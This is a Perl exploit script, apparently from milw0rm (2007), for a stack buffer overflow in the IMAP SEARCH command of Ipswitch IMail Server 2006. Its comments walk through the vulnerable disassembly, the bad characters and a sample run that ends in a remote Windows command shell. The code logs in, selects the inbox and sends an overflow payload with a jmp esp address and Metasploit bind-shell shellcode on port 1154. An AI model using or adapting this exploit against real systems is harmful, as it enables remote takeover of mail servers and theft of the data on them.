#!/use/bin/perl
#
# Ipswitch IMail Server 2006 IMAP SEARCH COMMAND Stack Overflow Exploit
# Author: ZhenHan.Liu#ph4nt0m.org
# Date: 2007-07-25
# Team: Ph4nt0m Security Team (http://www.ph4nt0m.org)
#
# Vuln Found by: Manuel Santamarina Suarez
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=563
#
# The Vuln code is here (imap4d32.exe version 6.8.8.1)
#  00418CCA  |.  8B8D 28EFFFFF |MOV ECX,DWORD PTR SS:[EBP-10D8]
#  00418CD0  |.  0FBE11        |MOVSX EDX,BYTE PTR DS:[ECX]
#  00418CD3  |.  83FA 22       |CMP EDX,22
#  00418CD6  |.  75 2A         |JNZ SHORT IMAP4D32.00418D02
#  00418CD8  |.  8B85 28EFFFFF |MOV EAX,DWORD PTR SS:[EBP-10D8]
#  00418CDE  |.  50            |PUSH EAX                                ; /String
#  00418CDF  |.  FF15 84004300 |CALL DWORD PTR DS:[<&KERNEL32.lstrlenA>>; \lstrlenA
#  00418CE5  |.  83E8 02       |SUB EAX,2
#  00418CE8  |.  50            |PUSH EAX                                ; /maxlen
#  00418CE9  |.  8B8D 28EFFFFF |MOV ECX,DWORD PTR SS:[EBP-10D8]         ; |
#  00418CEF  |.  83C1 01       |ADD ECX,1                               ; |
#  00418CF2  |.  51            |PUSH ECX                                ; |src
#  00418CF3  |.  8D55 AC       |LEA EDX,DWORD PTR SS:[EBP-54]           ; |
#  00418CF6  |.  52            |PUSH EDX                                ; |dest
#  00418CF7  |.  FF15 00024300 |CALL DWORD PTR DS:[<&MSVCR71.strncpy>]  ; \strncpy
#  00418CFD  |.  83C4 0C       |ADD ESP,0C
#  00418D00  |.  EB 13         |JMP SHORT IMAP4D32.00418D15
#  00418D02  |>  8B85 28EFFFFF |MOV EAX,DWORD PTR SS:[EBP-10D8]
#  00418D08  |.  50            |PUSH EAX                                ; /src
#  00418D09  |.  8D4D AC       |LEA ECX,DWORD PTR SS:[EBP-54]           ; |
#  00418D0C  |.  51            |PUSH ECX                                ; |dest
#  00418D0D  |.  E8 7E610100   |CALL <JMP.&MSVCR71.strcpy>              ; \strcpy
#  00418D12  |.  83C4 08       |ADD ESP,8
#  
#  The programmer has made an extreamly stupid mistake.
#  He checks the arg's first byte, if it is 0x22( " ),then invoke strcpy,
#  else strncpy.
#  the buffer overflow takes place when the strcpy is called.
#  But the strncpy is also vulnerable,because it just likes this: strncpy(dest, src, strlen(src)); 
#  So, whether the command was started with a '"' or not, the stack overflow will take place immediately.  
# 
#  Multiple SEARCH COMMAND is vulnerable,in this case, we use "SEARCH ON".
#  But others like "SEARCH BEFORE" command will also trigger the overflow.
#
#  NOTES: To trigger the Vuln, there must be at least one mail in the mailbox!!
#
#  Badchar is: 0x00 0x0a 0x0d 0x0b 0x09 0x0c 0x20
#
# Tested On Windows 2003 SP1 CN
#
#  D:\>perl imap.pl 192.168.226.128 143
#  * OK IMAP4 Server (IMail 9.10)
#  0 OK LOGIN completed
#  * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
#  * 1 EXISTS
#  * 1 RECENT
#  * OK [UIDVALIDITY 1185337300] UIDs valid
#  * OK [UIDNEXT 485337302] Predicted next UID
#  2 OK [READ-WRITE] SELECT completed
#  -------------- [BEGIN] -------------------
#  ----------------  [END]  ------------------
#  
#
#  D:\>nc -vv -n 192.168.226.128 1154
#  (UNKNOWN) [192.168.226.128] 1154 (?) open
#  Microsoft Windows [Â°Ã¦Â±Â¾ 5.2.3790]
#  (C) Â°Ã¦ÃˆÂ¨Ã‹Ã¹Ã“Ã 1985-2003 Microsoft Corp.
#  
#  C:\WINDOWS\system32>
#
#


use strict;
use warnings;
use IO::Socket;

#Target IP
my $host = shift ;
my $port = shift ;
my $account = "void";
my $password = "ph4nt0m.org";

my $pad1 = "void[at]ph4nt0m.org_" x 4 . "ph4nt0m";
my $pad2 = 'void[at]pstgroup';
my $jmpesp = "\x12\x45\xfa\x7f"; # Windows 2000/xp/2003 Universal

# win32_bind -  EXITFUNC=thread LPORT=1154 Size=344 Encoder=Pex http://metasploit.com
my $shellcode =
"\x29\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xb6".
"\x78\xf8\x75\x83\xee\xfc\xe2\xf4\x4a\x12\x13\x38\x5e\x81\x07\x8a".
"\x49\x18\x73\x19\x92\x5c\x73\x30\x8a\xf3\x84\x70\xce\x79\x17\xfe".
"\xf9\x60\x73\x2a\x96\x79\x13\x3c\x3d\x4c\x73\x74\x58\x49\x38\xec".
"\x1a\xfc\x38\x01\xb1\xb9\x32\x78\xb7\xba\x13\x81\x8d\x2c\xdc\x5d".
"\xc3\x9d\x73\x2a\x92\x79\x13\x13\x3d\x74\xb3\xfe\xe9\x64\xf9\x9e".
"\xb5\x54\x73\xfc\xda\x5c\xe4\x14\x75\x49\x23\x11\x3d\x3b\xc8\xfe".
"\xf6\x74\x73\x05\xaa\xd5\x73\x35\xbe\x26\x90\xfb\xf8\x76\x14\x25".
"\x49\xae\x9e\x26\xd0\x10\xcb\x47\xde\x0f\x8b\x47\xe9\x2c\x07\xa5".
"\xde\xb3\x15\x89\x8d\x28\x07\xa3\xe9\xf1\x1d\x13\x37\x95\xf0\x77".
"\xe3\x12\xfa\x8a\x66\x10\x21\x7c\x43\xd5\xaf\x8a\x60\x2b\xab\x26".
"\xe5\x2b\xbb\x26\xf5\x2b\x07\xa5\xd0\x10\xfc\xf7\xd0\x2b\x71\x94".
"\x23\x10\x5c\x6f\xc6\xbf\xaf\x8a\x60\x12\xe8\x24\xe3\x87\x28\x1d".
"\x12\xd5\xd6\x9c\xe1\x87\x2e\x26\xe3\x87\x28\x1d\x53\x31\x7e\x3c".
"\xe1\x87\x2e\x25\xe2\x2c\xad\x8a\x66\xeb\x90\x92\xcf\xbe\x81\x22".
"\x49\xae\xad\x8a\x66\x1e\x92\x11\xd0\x10\x9b\x18\x3f\x9d\x92\x25".
"\xef\x51\x34\xfc\x51\x12\xbc\xfc\x54\x49\x38\x86\x1c\x86\xba\x58".
"\x48\x3a\xd4\xe6\x3b\x02\xc0\xde\x1d\xd3\x90\x07\x48\xcb\xee\x8a".
"\xc3\x3c\x07\xa3\xed\x2f\xaa\x24\xe7\x29\x92\x74\xe7\x29\xad\x24".
"\x49\xa8\x90\xd8\x6f\x7d\x36\x26\x49\xae\x92\x8a\x49\x4f\x07\xa5".
"\x3d\x2f\x04\xf6\x72\x1c\x07\xa3\xe4\x87\x28\x1d\x59\xb6\x18\x15".
"\xe5\x87\x2e\x8a\x66\x78\xf8\x75";


my $sock = IO::Socket::INET->new( PeerHost=>$host, PeerPort=>$port, proto=>"tcp" ) || die "Connect error.\n";

my $res = <$sock>;
print $res;
if( $res !~ /OK/ )
{
	exit(-1);
}

# login
print $sock "0 LOGIN $account $password\r\n";
print $res = <$sock>;
if( $res !~ /0 OK/ )
{
	exit(-1);
}

# select
print $sock "1 SELECT INBOX\r\n";
while(1)
{
	print $res = <$sock>;
	if($res =~ /1 OK/)
	{	last; }
	elsif($res =~ /1 NO/ || $res =~ /BAD/)
	{ 	exit(-1); }
	else
	{	next; }
}

# search
my $payload = $pad1.$jmpesp.$pad2.$shellcode;
print $sock "2 SEARCH ON <$payload>\r\n";

$sock->close();

# milw0rm.com [2007-07-25]
